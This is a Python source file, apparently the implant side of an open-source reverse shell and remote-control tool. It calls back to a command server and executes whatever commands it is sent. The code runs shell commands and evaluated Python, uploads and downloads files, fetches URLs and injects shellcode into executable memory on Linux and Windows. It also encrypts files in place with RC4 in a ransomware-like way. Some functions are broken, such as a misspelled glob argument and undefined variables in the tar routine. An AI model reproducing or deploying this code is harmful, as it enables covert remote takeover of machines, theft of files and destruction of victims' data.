#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This package implements an advanced reverse shell console.
#    Copyright (C) 2023  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This package implements an advanced reverse shell
console (supports: TCP, UDP, IRC, HTTP and DNS).
"""

__version__ = "0.1.0"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This package implements an advanced reverse shell
console (supports: TCP, UDP, IRC, HTTP and DNS).
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/ReverseShell"

copyright = """
ReverseShell  Copyright (C) 2023  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = []

print(copyright)

from glob import iglob
from json import dumps
from shlex import split
from io import StringIO
from socket import socket
from getpass import getuser
from zipfile import ZipFile
from contextlib import suppress
from subprocess import run, PIPE
from platform import node, system
from urllib.parse import urlparse
from sys import argv, stderr, exit
from urllib.request import urlopen
from tarfile import open as taropen
from os.path import exists, basename
from gzip import compress, decompress
from base64 import b85decode, b85encode
from ssl import _create_unverified_context
from multiprocessing import Process, active_children
from contextlib import redirect_stderr, redirect_stdout
from os import getcwd, environ, listdir, name, urandom, chdir
from ctypes import (
    cdll,
    c_bool,
    c_byte,
    c_char,
    c_char_p,
    c_double,
    c_float,
    c_long,
    c_longlong,
    c_short,
    c_ubyte,
    c_ulong,
    c_ulonglong,
    c_ushort,
    c_void_p,
    c_wchar,
    c_wchar_p,
)

c_types = {
    "bool": c_bool,
    "byte": c_byte,
    "char": c_char,
    "char *": c_char_p,
    "double": c_double,
    "float": c_float,
    "long": c_long,
    "long long": c_longlong,
    "short": c_short,
    "unsigned byte": c_ubyte,
    "unsigned long": c_ulong,
    "unsigned long long": c_ulonglong,
    "unsigned short": c_ushort,
    "void *": c_void_p,
    "wchar": c_wchar,
    "wchar *": c_wchar_p,
}

if len(argv) != 2:
    print(f"USAGES: {argv[0]} key", file=stderr)
    exit(1)

key = argv[1].encode()


def init_key():
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    return bytes(S)


key = init_key()
key_temp = None


def rc4(plaintext: bytes, decrypt: bool = False) -> bytes:
    global key_temp, key
    if decrypt:
        iv = plaintext[:256]
        plaintext = plaintext[256:]
    else:
        iv = urandom(256)
    temp_key = bytearray([iv[i] ^ char for i, char in enumerate(key)])
    out = bytearray()
    i = j = 0
    for char in plaintext:
        i = (i + 1) % 256
        j = (j + temp_key[i]) % 256
        temp_key[i], temp_key[j] = temp_key[j], temp_key[i]
        out.append(char ^ temp_key[(temp_key[i] + temp_key[j]) % 256])
    if key_temp:
        key = bytes(
            [key[i % len(key)] ^ char for i, char in enumerate(key_temp)]
        )
        key_temp = None
    if decrypt:
        return out
    return iv + out


def encrypt_files(key, *paths, decrypt: bool = False):
    for path in paths:
        for filepath in iglob(path, recusive=True):
            process = Process(
                target=encrypt_file,
                args=(key, filepath, decrypt),
                name=("decrypt" if decrypt else "encrypt") + "_file " + repr(filepath),
            )
            process.start()


def encrypt_file(key_, path, decrypt: bool = False):
    global key
    key = key_.encode()
    key = init_key()
    with open(path, "rb+") as file:
        data = rc4(file.read(), decrypt)
        file.seek(0)
        file.write(data)
        file.truncate()

def make_tar_archive():
    with taropen(
        name, "w:" + indexed_extensions.get(index + 1, "")
    ) as tarfile:
        tuple(
            tarfile.add(filepath)
            for path in paths
            for filepath in iglob(path, recusive=True)
        )

def make_zip_archive(name, *paths):
    with ZipFile(name, "w") as zipfile:
        tuple(
            zipfile.write(filepath)
            for path in paths
            for filepath in iglob(path, recusive=True)
        )

def archive_files(name, *paths):
    indexed_extensions = {
        x if x == "tar" else i: i if x == "tar" else x
        for i, x in enumerate(name.split("."))
    }
    if index := indexed_extensions.get("tar"):
        make_archive = make_tar_archive
    elif name.endswith(".zip"):
        make_archive = make_zip_archive
    else:
        return b'Filename error, extension must be ".zip", ".tar.gz", ".tar.bz2", ".tar.xz" or ".tar"'

    process = Process(target=make_archive, args=(name, *paths), name="archive_files " + name)
    process.start()
    return b"Making archive..."


def call_library_function(library, function, *params):
    function = getattr(cdll.LoadLibrary(library), function)
    params_ = []
    for param in params:
        typename, _, value = param.partition(":")
        if typename == "bool":
            value = value.casefold() in ("true", "1", "on")
        elif typename in (
            "byte",
            "long",
            "long long",
            "short",
            "unsigned byte",
            "unsigned long",
            "unsigned long long",
            "unsigned short",
            "void *",
        ):
            value = int(value)
        elif typename == "char":
            value = int(value) if len(value) != 1 else value.encode("latin-1")
        elif typename == "char *":
            value = value.encode()
        elif typename == "double" or typename == "float":
            value = float(value)
        # String value for "wchar", "wchar *"
        params_.append(c_types[typename](value))
    function.restype = c_void_p
    value = function(*params_)
    return b"Return value: " + str(value).encode("ascii")


def download_from_url(url, filename=None):
    try:
        response = urlopen(url)
    except Exception as e:
        return f"{e.__class__.__name__}: {e}".encode()
    if not filename:
        filename = basename(urlparse(url).path) or "download.txt"
    with open(filename, "wb") as file:
        file.write(response.read())
    return b"Done"


def get_executables():
    return [
        file
        for directory in environ["PATH"].split(":" if name != "nt" else ";")
        if exists(directory)
        for file in listdir(directory)
    ]


def sendall(s, data):
    chunk = data[:30000]
    data = data[30000:]
    while chunk:
        s.sendall(chunk)
        chunk = data[:30000]
        data = data[30000:]


def posix_shellcode(shellcode):
    from mmap import (
        mmap,
        PAGESIZE,
        MAP_SHARED,
        PROT_READ,
        PROT_WRITE,
        PROT_EXEC,
    )
    from ctypes import string_at, CFUNCTYPE, c_void_p

    memory = mmap(
        -1,
        PAGESIZE,
        MAP_SHARED,
        PROT_READ | PROT_WRITE | PROT_EXEC,
    )
    memory.write(shellcode)
    address = int.from_bytes(string_at(id(memory) + 16, 8), "little")
    function_type = CFUNCTYPE(c_void_p)
    shellcode_function = function_type(address)
    stdout = StringIO()
    stderr = StringIO()
    with redirect_stdout(stdout), redirect_stderr(stderr):
        shellcode_function()
    return (stdout.getvalue() + stderr.getvalue()).encode() or b" "


def nt_shellcode(shellcode):
    from ctypes import (
        c_ulonglong,
        pointer as get_pointer,
        c_char,
        c_void_p,
        windll,
    )

    kernel32 = windll.kernel32
    shellcode_length = len(shellcode)
    shellcode = bytearray(shellcode)
    kernel32.VirtualAlloc.restype = c_void_p
    pointer = kernel32.VirtualAlloc(
        c_ulonglong(0),
        c_ulonglong(shellcode_length),
        c_ulonglong(0x3000),
        c_ulonglong(0x40),
    )
    buffer = (c_char * shellcode_length).from_buffer(shellcode)
    kernel32.RtlMoveMemory(
        c_ulonglong(pointer), buffer, c_ulonglong(shellcode_length)
    )
    stdout = StringIO()
    stderr = StringIO()
    with redirect_stdout(stdout), redirect_stderr(stderr):
        thread = kernel32.CreateThread(
            c_ulonglong(0),
            c_ulonglong(0),
            c_ulonglong(pointer),
            c_ulonglong(0),
            c_ulonglong(0),
            get_pointer(c_ulonglong(0)),
        )
    kernel32.WaitForSingleObject(c_ulonglong(thread), c_ulonglong(-1))
    return (stdout.getvalue() + stderr.getvalue()).encode() or b" "


format_ = b"POST / HTTP/1.0\r\nContent-Type: {type}\r\nHost: 127.0.0.1\r\nContent-Length: {length}\r\n\r\n"
context = _create_unverified_context()


def send_environnement(all=True):
    global key_temp
    recevied = b""
    while recevied != b"\6":
        s = socket()
        s.connect(("127.0.0.1", 1337))
        data = rc4(
            b"\1"
            + (
                dumps(
                    {
                        "hostname": node(),
                        "user": getuser(),
                        "cwd": getcwd(),
                        "executables": get_executables()
                        + [
                            "cd",
                            "update_environment",
                            "upload_file",
                            "download_file",
                            "download_url",
                            "python3_exec",
                            "upload_file_compress",
                            "download_file_compress",
                            "python3_exec_compress",
                            "shellcode",
                            "shellcode_compress",
                            "encrypt_file",
                            "encrypt_files",
                            "decrypt_file",
                            "decrypt_files",
                            "archive_files",
                            "call_library_function",
                        ],
                        "files": listdir(),
                        "system": system(),
                        "encoding": "base85",
                        "commpression": "gzip",
                        "key": b85encode(compress(key_temp := urandom(256))).decode(),
                    }
                ).encode()
                if all
                else dumps(
                    {
                        "files": listdir(),
                        "cwd": getcwd(),
                    }
                ).encode()
            )
        )
        s = context.wrap_socket(s)
        sendall(
            s,
            format_.replace(
                b"{type}", b"application/json; charset=utf-8"
            ).replace(b"{length}", str(len(data)).encode("latin-1"))
            + data,
        )
        recevied = rc4(s.recv(65535).split(b"\r\n\r\n", 1)[1], True)
        s.close()


def python_exec(code):
    stdout = StringIO()
    stderr = StringIO()
    with redirect_stdout(stdout), redirect_stderr(stderr):
        stdout.write(str(eval(code)))
    return (stdout.getvalue() + stderr.getvalue()).encode() or b" "


def command(data):
    s = socket()
    s.connect(("127.0.0.1", 1337))
    s = context.wrap_socket(s)
    sendall(
        s,
        format_.replace(b"{type}", b"text/plain; charset=utf-8").replace(
            b"{length}", str(len(data)).encode("latin-1")
        )
        + rc4(data),
    )
    command = rc4(s.recv(65535).split(b"\r\n\r\n", 1)[1], True).decode()
    if command.strip().startswith("cd "):
        data = b'done'
        chdir(command[3:])
        send_environnement(False)
    elif command.strip() == "update_environment":
        send_environnement()
        data = b"done"
    elif command.strip().startswith("upload_file "):
        _, filename, content = split(command)
        open(filename, "wb").write(b85decode(content.encode()))
        data = b"done"
    elif command.strip().startswith("upload_file_compress "):
        _, filename, content = split(command)
        open(filename, "wb").write(decompress(b85decode(content.encode())))
        data = b"done"
    elif command.strip().startswith("download_file "):
        data = b85encode(open(command[14:], "rb").read())
    elif command.strip().startswith("download_file_compress "):
        data = b85encode(compress(open(command[23:], "rb").read()))
    elif command.strip().startswith("python3_exec "):
        data = python_exec(command[13:])
    elif command.strip().startswith("python3_exec_compress "):
        data = python_exec(decompress(b85decode(command[22:])))
    elif command.strip().startswith("shellcode "):
        data = globals()[name + "_shellcode"](b85decode(command[10:]))
    elif command.strip().startswith("shellcode_compress "):
        data = globals()[name + "_shellcode"](
            decompress(b85decode(command[19:]))
        )
    elif command.strip().startswith("encrypt_file "):
        _, encryption_key, file = split(command)
        process = Process(
            target=encrypt_file,
            args=(encryption_key, file),
            name="encrypt_file " + repr(file),
        )
        process.start()
        data = b"Encryption is running..."
    elif command.strip().startswith("encrypt_files "):
        encrypt_files(*split(command)[1:])
        data = b"Encryption is running..."
    elif command.strip().startswith("decrypt_file "):
        _, encryption_key, file = split(command)
        process = Process(
            target=encrypt_file,
            args=(encryption_key, file, True),
            name="decrypt_file " + repr(file),
        )
        process.start()
        data = b"Decryption is running..."
    elif command.strip().startswith("decrypt_files "):
        encrypt_files(*split(command)[1:], decrypt=True)
        data = b"Decryption is running..."
    elif command.strip().startswith("download_url "):
        data = download_from_url(*split(command)[1:])
    elif command.strip().startswith("archive_files "):
        data = archive_files(*split(command)[1:])
    elif command.strip().startswith("call_library_function "):
        data = call_library_function(*split(command)[1:])
    else:
        p = run(command, shell=True, stdout=PIPE, stderr=PIPE)
        data = (p.stdout + p.stderr) or b" "
        s.close()
    childs = len(active_children())
    if childs:
        data += (
            b"\n\x1b[34m[*] "
            + str(childs).encode("ascii")
            + b" childs process are running..."
        )
    return data

while True and __name__ == "__main__":
    with suppress(Exception):
        send_environnement()
        data = b" "
        while True:
            try:
                data = command(data)
            except Exception as e:
                data = f"{e.__class__.__name__}: {e}".encode()
                raise e
